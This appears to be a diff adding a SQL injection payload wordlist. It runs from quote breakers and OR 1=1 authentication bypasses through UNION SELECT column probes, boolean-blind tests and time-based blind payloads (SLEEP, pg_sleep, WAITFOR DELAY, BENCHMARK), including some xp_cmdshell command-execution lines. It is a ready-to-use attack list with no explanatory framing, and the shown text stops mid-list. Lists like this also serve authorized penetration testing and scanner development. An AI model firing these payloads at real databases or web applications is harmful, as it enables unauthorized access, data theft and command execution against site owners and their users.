@@ -1,0 +1,470 @@
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+;
+'
+" or "
+-- or #
+' OR '1'
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+'''''''''''''UNION SELECT '2
+%00
+/…/
+UNION ALL SELECT NULL, NULL, NULL --
+UNION SELECT NULL, NULL, NULL --
+UNION ALL SELECT NULL, NULL, NULL, NULL --
+UNION SELECT NULL, NULL, NULL, NULL --
+UNION ALL SELECT 1, NULL, NULL, NULL --
+UNION SELECT 1, NULL, NULL, NULL --
+UNION ALL SELECT NULL, 1, NULL, NULL --
+UNION SELECT NULL, 1, NULL, NULL --
+UNION ALL SELECT NULL, NULL, 1, NULL --
+UNION SELECT NULL, NULL, 1, NULL --
+UNION ALL SELECT NULL, NULL, NULL, 1 --
+UNION SELECT NULL, NULL, NULL, 1 --
+UNION ALL SELECT 1, 1, 1, 1 --
+UNION SELECT 1, 1, 1, 1 --
+UNION ALL SELECT 'a', NULL, NULL, NULL --
+UNION SELECT 'a', NULL, NULL, NULL --
+UNION ALL SELECT NULL, 'a', NULL, NULL --
+UNION SELECT NULL, 'a', NULL, NULL --
+UNION ALL SELECT NULL, NULL, 'a', NULL --
+UNION SELECT NULL, NULL, 'a', NULL --
+UNION ALL SELECT NULL, NULL, NULL, 'a' --
+UNION SELECT NULL, NULL, NULL, 'a' --
+UNION ALL SELECT 'a', 'a', 'a', 'a' --
+UNION SELECT 'a', 'a', 'a', 'a' --
+UNION ALL SELECT 'a', NULL, 'a', NULL --
+UNION SELECT 'a', NULL, 'a', NULL --
+UNION ALL SELECT 'a', NULL, 'a', 'a' --
+UNION SELECT 'a', NULL, 'a', 'a' --
+UNION ALL SELECT 'a', 'a', 'a', NULL --
+UNION SELECT 'a', 'a', 'a', NULL --
+UNION ALL SELECT 'a', 'a', NULL, 'a' --
+UNION SELECT 'a', 'a', NULL, 'a' --
+UNION ALL SELECT 'a', NULL, 'a', NULL --
+UNION SELECT 'a', NULL, 'a', NULL --
+AND 1=1
+AND 1=0
+OR 1=1
+OR 1=0
+AND x=x
+AND x=y
+AND 1=1--
+AND 1=0--
+AND x=x--
+AND x=y--
+AND 1=1#
+AND 1=0#
+AND x=x#
+AND x=y#
+AND 1=1/*
+AND 1=0/*
+AND x=x/*
+AND x=y/*
+AND 1=1;
+AND 1=0;
+AND x=x;
+AND x=y;
+AND 1=1%00
+AND 1=0%00
+AND x=x%00
+AND x=y%00
+OR 1=1%00
+OR 1=0%00
+OR x=x%00
+OR x=y%00
+AND 1=1%25
+AND 1=0%25
+AND x=x%25
+AND x=y%25
+OR 1=1%25
+OR 1=0%25
+OR x=x%25
+OR x=y%25
+AND 1=1%23
+AND 1=0%23
+AND x=x%23
+AND x=y%23
+OR 1=1%23
+OR 1=0%23
+OR x=x%23
+OR x=y%23
+AND 1=1%3D
+AND 1=0%3D
+AND x=x%3D
+AND x=y%3D
+AND 1=0%0D
+AND x=x%0D
+AND x=y%0D
+OR 1=1%0D
+OR 1=0%0D
+OR x=x%0D
+OR x=y%0D
+AND 1=1%09
+AND 1=0%09
+AND x=x%09
+AND x=y%09
+OR 1=1%09
+OR 1=0%09
+OR x=x%09
+OR x=y%09
+AND 1=1%0C
+AND 1=0%0C
+AND x=x%0C
+AND x=y%0C
+OR 1=1%0C
+OR 1=0%0C
+OR x=x%0C
+OR x=y%0C
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
+SELECT * FROM some_table WHERE double_quotes = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/"
+UPDATE some_table SET secret_value = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/'
+SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/ FROM some_table WHERE ex = ample
+'; SELECT pg_sleep(10)--
+"; SELECT pg_sleep(10)--
+'; WAITFOR DELAY '0:0:10'--
+"; WAITFOR DELAY '0:0:10'--
+'; if pg_sleep(10)--
+"; if pg_sleep(10)--
+'; if WAITFOR DELAY '0:0:10'--
+"; if WAITFOR DELAY '0:0:10'--
+'; exec xp_cmdshell 'timeout /T 10'--
+"; exec xp_cmdshell 'timeout /T 10'--
+'; exec xp_cmdshell 'ping -n 10 127.0.0.1'--
+"; exec xp_cmdshell 'ping -n 10 127.0.0.1'--
+'; exec xp_cmdshell 'sleep 10'--
+"; exec xp_cmdshell 'sleep 10'--
+'; if (select pg_sleep(10))--
+"; if (select pg_sleep(10))--
+'; if (WAITFOR DELAY '0:0:10')--
+"; if (WAITFOR DELAY '0:0:10')--
+'; if (EXECUTE AS LOGIN = 'sa' WAITFOR DELAY '0:0:10')--
+"; if (EXECUTE AS LOGIN = 'sa' WAITFOR DELAY '0:0:10')--
+)%20waitfor%20delay%20'0:0:20'%20/*
+)%20waitfor%20delay%20'0:0:20'%20--
+')%20waitfor%20delay%20'0:0:20'%20/*
+')%20waitfor%20delay%20'0:0:20'%20--
+")%20waitfor%20delay%20'0:0:20'%20/*
+")%20waitfor%20delay%20'0:0:20'%20--
+))%20waitfor%20delay%20'0:0:20'%20/*
+))%20waitfor%20delay%20'0:0:20'%20--
+'))%20waitfor%20delay%20'0:0:20'%20/*
+'))%20waitfor%20delay%20'0:0:20'%20--
+"))%20waitfor%20delay%20'0:0:20'%20/*
+"))%20waitfor%20delay%20'0:0:20'%20--
+,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL)%20waifor%20delay%20'0:0:20'%20/*
+',NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL)%20waifor%20delay%20'0:0:20'%20/*
+'),NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+waitfor delay '0:0:20' /*
+ waitfor delay '0:0:20' --
+' waitfor delay '0:0:20' /*
+' waitfor delay '0:0:20' --
+" waitfor delay '0:0:20' /*
+" waitfor delay '0:0:20' --
+) waitfor delay '0:0:20' /*
+) waitfor delay '0:0:20' --
+)) waitfor delay '0:0:20' /*
+)) waitfor delay '0:0:20' --
+))) waitfor delay '0:0:20' /*
+))) waitfor delay '0:0:20' --
+)))) waitfor delay '0:0:20' /*
+)))) waitfor delay '0:0:20' --
+))))) waitfor delay '0:0:20' --
+)))))) waitfor delay '0:0:20' --
+') waitfor delay '0:0:20' /*
+') waitfor delay '0:0:20' --
+") waitfor delay '0:0:20' /*
+") waitfor delay '0:0:20' --
+')) waitfor delay '0:0:20' /*
+')) waitfor delay '0:0:20' --
+")) waitfor delay '0:0:20' /*
+")) waitfor delay '0:0:20' --
+'))) waitfor delay '0:0:20' /*
+'))) waitfor delay '0:0:20' --
+"))) waitfor delay '0:0:20' /*
+"))) waitfor delay '0:0:20' --
+')))) waitfor delay '0:0:20' /*
+')))) waitfor delay '0:0:20' --
+")))) waitfor delay '0:0:20' /*
+")))) waitfor delay '0:0:20' --
+'))))) waitfor delay '0:0:20' /*
+'))))) waitfor delay '0:0:20' --
+"))))) waitfor delay '0:0:20' /*
+"))))) waitfor delay '0:0:20' --
+')))))) waitfor delay '0:0:20' /*
+')))))) waitfor delay '0:0:20' --
+")))))) waitfor delay '0:0:20' /*
+")))))) waitfor delay '0:0:20' --
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+ and 0=benchmark(3000000,MD5(1))%20/*
+ and 0=benchmark(3000000,MD5(1))%20--
+ and 0=benchmark(3000000,MD5(1))%20%23
+' and 0=benchmark(3000000,MD5(1))%20/*
+' and 0=benchmark(3000000,MD5(1))%20--
+' and 0=benchmark(3000000,MD5(1))%20%23
+" and 0=benchmark(3000000,MD5(1))%20/*
+" and 0=benchmark(3000000,MD5(1))%20--
+" and 0=benchmark(3000000,MD5(1))%20%23
+) and 0=benchmark(3000000,MD5(1))%20/*
+) and 0=benchmark(3000000,MD5(1))%20--
+) and 0=benchmark(3000000,MD5(1))%20%23
+)) and 0=benchmark(3000000,MD5(1))%20/*
+)) and 0=benchmark(3000000,MD5(1))%20--
+)) and 0=benchmark(3000000,MD5(1))%20%23
+))) and 0=benchmark(3000000,MD5(1))%20/*
+))) and 0=benchmark(3000000,MD5(1))%20--
+))) and 0=benchmark(3000000,MD5(1))%20%23
+)))) and 0=benchmark(3000000,MD5(1))%20/*
+)))) and 0=benchmark(3000000,MD5(1))%20--
+)))) and 0=benchmark(3000000,MD5(1))%20%23
+') and 0=benchmark(3000000,MD5(1))%20/*
+') and 0=benchmark(3000000,MD5(1))%20--
+') and 0=benchmark(3000000,MD5(1))%20%23
+") and 0=benchmark(3000000,MD5(1))%20/*
+") and 0=benchmark(3000000,MD5(1))%20--
+") and 0=benchmark(3000000,MD5(1))%20%23
+')) and 0=benchmark(3000000,MD5(1))%20/*
+')) and 0=benchmark(3000000,MD5(1))%20--
+')) and 0=benchmark(3000000,MD5(1))%20%23
+")) and 0=benchmark(3000000,MD5(1))%20/*
+")) and 0=benchmark(3000000,MD5(1))%20--
+")) and 0=benchmark(3000000,MD5(1))%20%23
+'))) and 0=benchmark(3000000,MD5(1))%20/*
+'))) and 0=benchmark(3000000,MD5(1))%20--
+'))) and 0=benchmark(3000000,MD5(1))%20%23
+"))) and 0=benchmark(3000000,MD5(1))%20/*
+"))) and 0=benchmark(3000000,MD5(1))%20--
+"))) and 0=benchmark(3000000,MD5(1))%20%23
+')))) and 0=benchmark(3000000,MD5(1))%20/*
+')))) and 0=benchmark(3000000,MD5(1))%20--
+')))) and 0=benchmark(3000000,MD5(1))%20%23
+")))) and 0=benchmark(3000000,MD5(1))%20/*
+")))) and 0=benchmark(3000000,MD5(1))%20--
+")))) and 0=benchmark(3000000,MD5(1))%20%23
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
